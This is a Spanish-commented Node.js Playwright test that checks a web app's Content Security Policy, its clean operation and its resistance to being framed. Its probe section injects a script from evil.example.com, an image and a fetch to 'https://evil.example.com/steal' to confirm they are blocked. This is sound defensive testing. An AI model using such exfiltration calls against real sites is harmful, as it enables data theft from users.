/* Política de seguridad del contenido (CSP): se lee la que declara index.html y se comprueba que
   (1) no hay scripts ni manejadores en línea (la política los prohíbe), (2) la app arranca y se usa sin ninguna infracción,
   (3) la política realmente bloquea lo ajeno (script en línea, script de otro sitio, conexión a otro sitio),
   (4) la app no se deja mostrar dentro de otra página (guard.js).  Uso: node tests/csp.js */
const { chromium } = require('playwright');
const http = require('http'), fs = require('fs'), path = require('path');
const ROOT = path.resolve(__dirname, '..');
const MIME = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.png': 'image/png', '.webmanifest': 'application/manifest+json' };
const srv = http.createServer((q, r) => { let p = decodeURIComponent(q.url.split('?')[0]); if (p === '/') p = '/index.html'; if (p === '/framer') { r.setHeader('content-type', 'text/html'); return r.end('<iframe id="f" src="/" style="width:400px;height:600px"></iframe>'); }
  const f = path.join(ROOT, p); if (!f.startsWith(ROOT) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { r.statusCode = 404; return r.end('no'); } r.setHeader('content-type', MIME[path.extname(f)] || 'application/octet-stream'); r.end(fs.readFileSync(f)); });
let fails = 0; const ok = (c, m) => { if (!c) fails++; console.log((c ? '  ✓ ' : '  ✗ ') + m); };

(async () => {
  console.log('1. Lo que declara index.html');
  const html = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8');
  const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
  ok(!!m, 'hay una política de seguridad del contenido');
  const pol = {}; (m ? m[1] : '').split(';').map(x => x.trim()).filter(Boolean).forEach(x => { const [k, ...v] = x.split(/\s+/); pol[k] = v; });
  ok(pol['default-src'] && pol['default-src'].join() === "'none'", "por defecto no se permite nada (default-src 'none')");
  ok(!pol['script-src'].includes("'unsafe-inline'") && !pol['script-src'].includes("'unsafe-eval'"), 'los scripts no admiten «en línea» ni eval');
  ok(pol['script-src'].every(x => x === "'self'" || /^https:\/\/[^/]+\/[^*]+\/$/.test(x)), 'los scripts de otros sitios están limitados a una carpeta concreta');
  ok(pol['object-src'].join() === "'none'" && pol['base-uri'].join() === "'self'" && pol['form-action'].join() === "'self'", 'sin plugins; base y formularios solo hacia el propio sitio');
  ok(!/<script(?![^>]*\ssrc=)[^>]*>/i.test(html), 'index.html no tiene scripts en línea');
  ok(!/\son[a-z]+\s*=/i.test(html), 'index.html no tiene manejadores en línea (onclick=…)');
  const jsFiles = fs.readdirSync(ROOT).filter(f => f.endsWith('.js') && f !== 'sw.js');
  const bad = jsFiles.filter(f => /\son(click|change|input|submit|load|error)=["']|\beval\(|new Function\(/.test(fs.readFileSync(path.join(ROOT, f), 'utf8')));
  ok(bad.length === 0, 'el código no genera manejadores en línea ni usa eval' + (bad.length ? ': ' + bad.join(', ') : ''));
  const sw = fs.readFileSync(path.join(ROOT, 'sw.js'), 'utf8');
  ok(/guard\.js/.test(sw) && /backup\.js/.test(sw), 'guard.js y backup.js están en la caché sin conexión');

  console.log('2. La app corre sin infracciones y la política bloquea lo ajeno');
  await new Promise(r => srv.listen(0, r)); const URL = 'http://localhost:' + srv.address().port + '/';
  const br = await chromium.launch(), viol = [], errors = [];
  const ctx = await br.newContext({ viewport: { width: 390, height: 780 }, serviceWorkers: 'block' });
  await ctx.addInitScript({ path: path.join(__dirname, 'fake-remote.js') });
  await ctx.addInitScript(() => { window.__viol = []; document.addEventListener('securitypolicyviolation', e => window.__viol.push(e.violatedDirective + ' ' + e.blockedURI)); });
  const page = await ctx.newPage();
  page.on('pageerror', e => errors.push(e.message));
  await page.route(/fonts\.(googleapis|gstatic)\.com/, r => r.abort());
  await page.goto(URL); await page.waitForSelector('#gForm');
  await page.click('[data-g="mode"][data-v="signup"]'); await page.selectOption('#gSex', 'F'); await page.fill('#gName', 'Cristian'); await page.fill('#gEmail', 'c@correo.cl'); await page.fill('#gPass', 'clave123'); await page.fill('#gPass2', 'clave123'); await page.check('#gPriv');
  await page.click('#gForm button[type=submit]'); await page.waitForTimeout(600);
  await page.evaluate(() => __fake.admin('config/team', { coachUid: __fake.uid('c@correo.cl') }));
  await page.waitForSelector('#appRoot:not([hidden])', { timeout: 8000 });
  for (const t of ['hoy', 'plan', 'prog', 'max', 'equipo', 'planual']) { const b = page.locator('#nav button[data-tab="' + t + '"]'); if (await b.count()) { await b.click(); await page.waitForTimeout(150); } }
  ok((await page.evaluate(() => window.__viol)).length === 0, 'recorrer la app entera no produce ninguna infracción (' + (await page.evaluate(() => window.__viol.join(' | '))) + ')');
  const probe = await page.evaluate(async () => {
    const out = {};
    window.__viol.length = 0;
    const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.appendChild(s);
    const e = document.createElement('script'); e.src = 'https://evil.example.com/x.js'; document.head.appendChild(e);
    try { await fetch('https://evil.example.com/steal', { mode: 'no-cors' }); out.fetch = 'pasó'; } catch (x) { out.fetch = 'bloqueado'; }
    const i = document.createElement('img'); i.src = 'https://evil.example.com/p.png'; document.body.appendChild(i);
    await new Promise(r => setTimeout(r, 300));
    out.inline = window.__inline === 1; out.viol = window.__viol.slice(); return out;
  });
  ok(!probe.inline, 'un script en línea inyectado no se ejecuta');
  ok(probe.fetch === 'bloqueado', 'una conexión a otro sitio queda bloqueada');
  ok(probe.viol.some(v => /^script-src/.test(v) && /evil/.test(v)) && probe.viol.some(v => /^img-src/.test(v)), 'un script y una imagen de otro sitio quedan bloqueados');
  ok(errors.length === 0, 'sin errores de JavaScript' + (errors.length ? ': ' + errors.slice(0, 2).join(' | ') : ''));

  console.log('3. No se deja mostrar dentro de otra página');
  const p2 = await ctx.newPage(); await p2.route(/fonts\.(googleapis|gstatic)\.com/, r => r.abort());
  await p2.goto(URL + 'framer'); await p2.waitForTimeout(800);
  const fr = p2.frames().find(f => f !== p2.mainFrame());
  const hiddenOrLeft = !fr || (await fr.evaluate(() => getComputedStyle(document.documentElement).display === 'none').catch(() => true)) || p2.url() !== URL + 'framer';
  ok(hiddenOrLeft, 'dentro de un marco ajeno la app se oculta o sale del marco');

  await br.close(); srv.close();
  console.log(fails ? '\nFALLAS: ' + fails : '\nTodo bien'); process.exit(fails ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
